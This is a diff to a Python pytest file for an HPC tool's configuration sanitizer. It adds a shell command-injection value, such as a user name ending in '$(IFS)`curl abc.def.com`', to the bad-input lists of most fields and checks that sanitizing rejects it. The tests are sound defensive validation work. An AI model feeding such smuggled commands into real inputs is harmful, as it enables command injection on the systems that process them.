@@ -5,6 +5,7 @@ import pytest
 #
 
 from dlaas.tuilib.common import Config
+from dlaas.tuilib.common import sanitize_dictionary
 
 
 def test_server_illegal_characters():
@@ -20,7 +21,7 @@ def test_server_illegal_characters():
         for item in config.__dict__:
             with pytest.raises(SyntaxError):
                 config.__dict__[item] = key
-                config.sanitize()
+                sanitize_dictionary(config.__dict__)
 
 
 # Server config
@@ -33,12 +34,13 @@ def test_server_user():
         "m rossi",
         "m.rossi",
         "mrossi 123",
+        "mrossi$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["user"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_server_host():
@@ -49,12 +51,13 @@ def test_server_host():
         "123.456.789.",
         "login02-ext.g100.cineca.it test",
         "login02-ext.g100.cineca.it.",
+        "123.456.789$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["host"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_server_venv_path():
@@ -62,14 +65,15 @@ def test_server_venv_path():
     config = Config("server")
 
     bad_keys = [
-        "home/lbabetto",
+        "home/mrossi",
         "~/dtaas_venv bash",
+        "/home/mrossi$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["venv_path"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_server_ssh_key():
@@ -77,14 +81,15 @@ def test_server_ssh_key():
     config = Config("server")
 
     bad_keys = [
-        "~/.ssh/luca-hpc test",
-        "bash ~/.ssh/luca-hpc",
+        "~/.ssh/mario-hpc test",
+        "bash ~/.ssh/mario-hpc",
+        "~/.ssh/mario-hpc$(IFS)$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["ssh_key"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_server_mail():
@@ -96,12 +101,13 @@ def test_server_mail():
         "m.rossi+123@cineca.it",
         "m.rossicineca.it",
         "m.rossi-45@cineca.it bash",
+        "m.rossi@cineca.it$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["mail"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_server_walltime():
@@ -111,12 +117,13 @@ def test_server_walltime():
     bad_keys = [
         "test12-34:56:78",
         "12-34:56:78 bash",
+        "12-34:56:78$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["walltime"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_server_nodes():
@@ -131,12 +138,13 @@ def test_server_nodes():
         "34:56:78",
         "3km",
         "2n",
+        "12$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["nodes"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_server_ntasks_per_node():
@@ -149,12 +157,13 @@ def test_server_ntasks_per_node():
         "12-34",
         "56:78",
         "34:56:78",
+        "12$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["ntasks_per_node"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 # HPC config
@@ -165,12 +174,13 @@ def test_hpc_user():
     bad_keys = [
         "test abc",
         "pippo$(IFS)",
+        "mario$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["user"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_password():
@@ -180,12 +190,13 @@ def test_hpc_password():
     bad_keys = [
         "test abc",
         "test `bash 123`",
+        "password$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["password"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_ip():
@@ -193,15 +204,16 @@ def test_hpc_ip():
     config = Config("hpc")
 
     bad_keys = [
-        "131.175.205.87 123",
+        "123.456.678.90 123",
         "login02`-ext.g100.cineca.it",
-        "131.175.205.87$",
+        "123.456.678.90$",
+        "123.456.678.90$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["ip"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_port():
@@ -212,12 +224,13 @@ def test_hpc_port():
         "abc",
         "2$",
         "28ht",
+        "27017$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["port"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_database():
@@ -227,12 +240,13 @@ def test_hpc_database():
     bad_keys = [
         "2$",
         "e test",
+        "test$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["database"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_collection():
@@ -242,12 +256,13 @@ def test_hpc_collection():
     bad_keys = [
         "2$",
         "e test",
+        "test$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["collection"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_s3_endpoint_url():
@@ -259,12 +274,13 @@ def test_hpc_s3_endpoint_url():
         "s3ds.g100st.cineca.it.",
         "httpas://s3ds.g100st.cineca.it/",
         "https://s3ds.g100st.cineca.it.",
+        "https://s3ds.g100st.cineca.it$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["s3_endpoint_url"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_s3_bucket():
@@ -274,12 +290,13 @@ def test_hpc_s3_bucket():
     bad_keys = [
         "2$",
         "e test",
+        "test$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["s3_bucket"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
 
 
 def test_hpc_pfs_prefix_path():
@@ -291,9 +308,10 @@ def test_hpc_pfs_prefix_path():
         "./g100_s3/DRES_s3poc",
         "/g100_s3/DRES_s3poc test",
         "/g100_s3/DRES_s3poc``",
+        "/g100s3/DRES_s3poc$(IFS)`curl abc.def.com`",
     ]
 
     for key in bad_keys:
         with pytest.raises(SyntaxError):
             config.__dict__["pfs_prefix_path"] = key
-            config.sanitize()
+            sanitize_dictionary(config.__dict__)
